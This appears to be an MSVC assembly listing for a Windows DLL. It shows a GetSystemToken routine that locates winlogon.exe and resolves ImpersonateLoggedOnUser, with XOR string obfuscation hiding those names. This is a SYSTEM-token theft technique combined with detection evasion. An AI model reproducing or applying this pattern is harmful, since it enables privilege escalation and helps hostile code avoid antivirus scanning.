??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ PROC ; `ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator(), COMDAT

; 312  : 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN26@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 32478815		; 01ef965fH
	mov	DWORD PTR [rbx], -1622565340		; 9f499e24H
	mov	DWORD PTR [rbx+4], -708440448		; d5c60e80H
	mov	WORD PTR [rbx+8], 37501			; 0000927dH
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 312  : 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN26@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ ENDP ; `ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 80
??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ PROC ; `ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator(), COMDAT

; 322  : 	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));

	push	rbx
	sub	rsp, 64					; 00000040H
	movdqa	xmm0, XMMWORD PTR __xmm@96b046b2cf9ec9ac9db852afe68bd084
	mov	DWORD PTR obfuscator$[rsp+16], -694816087 ; d695f2a9H
	mov	DWORD PTR obfuscator$[rsp+20], -207272786 ; f3a544aeH
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+24], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 322  : 	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));

	lea	rax, QWORD PTR [rbx+23]
	lea	rcx, QWORD PTR obfuscator$[rsp+23]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
??R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ ENDP ; `ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 80
?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	mov	QWORD PTR [rdx+16], rax
	ret	0
??__Fobfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	BYTE PTR [rdx+12], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<24,-876194367214469683,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAXXZ ; ay::obfuscated_data<24,-876194367214469683,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<24,-876194367214469683,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<24,-876194367214469683,char>::~obfuscated_data<24,-876194367214469683,char>, COMDAT

; 128  : 		{

	xorps	xmm0, xmm0

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<24,-876194367214469683,char>::~obfuscated_data<24,-876194367214469683,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@1@@Z PROC ; ay::obfuscated_data<24,-876194367214469683,char>::obfuscated_data<24,-876194367214469683,char>, COMDAT

; 118  : 		obfuscated_data(const obfuscator<N, KEY, CHAR_TYPE>& obfuscator)

	mov	r9, rcx

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+24], 1
	add	rcx, 23
	lea	rax, QWORD PTR [rdx+23]
	cmp	r9, rax
	ja	SHORT $LN10@obfuscated
	cmp	rcx, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	r8, r9
	sub	rdx, r9
	mov	ecx, 24
	npad	12
$LL15@obfuscated:
	movzx	eax, BYTE PTR [rdx+r8]
	mov	BYTE PTR [r8], al
	lea	r8, QWORD PTR [r8+1]
	sub	rcx, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	movups	xmm0, XMMWORD PTR [rdx]
	movsd	xmm1, QWORD PTR [rdx+16]
	movups	XMMWORD PTR [r9], xmm0
	movsd	QWORD PTR [r9+16], xmm1

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
??0?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@1@@Z ENDP ; ay::obfuscated_data<24,-876194367214469683,char>::obfuscated_data<24,-876194367214469683,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
??B?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<13,-4924288238255343789,char>::operator char *, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+13], 0

; 139  : 		{

	mov	r8, rcx

; 147  : 			if ( m_encrypted )

	je	$LN29@operator

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN28@operator

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@bba969eff327f753bba969eff327f753
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN28@operator:
	mov	r9, -4924288238255343789		; bba969eff327f753H
$LL27@operator:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 13
	jb	SHORT $LL27@operator

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+13], 0
$LN29@operator:

; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}

	mov	rax, r8
	ret	0
??B?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<13,-4924288238255343789,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<13,-4924288238255343789,char>::~obfuscated_data<13,-4924288238255343789,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	DWORD PTR [rcx+8], eax
	mov	BYTE PTR [rcx+12], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<13,-4924288238255343789,char>::~obfuscated_data<13,-4924288238255343789,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@1@@Z PROC ; ay::obfuscated_data<13,-4924288238255343789,char>::obfuscated_data<13,-4924288238255343789,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+13], 1
	movzx	eax, BYTE PTR [rdx]
	mov	BYTE PTR [rcx], al
	movzx	eax, BYTE PTR [rdx+1]
	mov	BYTE PTR [rcx+1], al
	movzx	eax, BYTE PTR [rdx+2]
	mov	BYTE PTR [rcx+2], al
	movzx	eax, BYTE PTR [rdx+3]
	mov	BYTE PTR [rcx+3], al
	movzx	eax, BYTE PTR [rdx+4]
	mov	BYTE PTR [rcx+4], al
	movzx	eax, BYTE PTR [rdx+5]
	mov	BYTE PTR [rcx+5], al
	movzx	eax, BYTE PTR [rdx+6]
	mov	BYTE PTR [rcx+6], al
	movzx	eax, BYTE PTR [rdx+7]
	mov	BYTE PTR [rcx+7], al
	movzx	eax, BYTE PTR [rdx+8]
	mov	BYTE PTR [rcx+8], al
	movzx	eax, BYTE PTR [rdx+9]
	mov	BYTE PTR [rcx+9], al
	movzx	eax, BYTE PTR [rdx+10]
	mov	BYTE PTR [rcx+10], al
	movzx	eax, BYTE PTR [rdx+11]
	mov	BYTE PTR [rcx+11], al
	movzx	eax, BYTE PTR [rdx+12]
	mov	BYTE PTR [rcx+12], al
	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@1@@Z ENDP ; ay::obfuscated_data<13,-4924288238255343789,char>::obfuscated_data<13,-4924288238255343789,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
??B?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<14,1978695492441415517,char>::operator char *, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+14], 0

; 139  : 		{

	mov	r8, rcx

; 147  : 			if ( m_encrypted )

	je	$LN29@operator

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN28@operator

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@1b75bd1119a31f5d1b75bd1119a31f5d
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
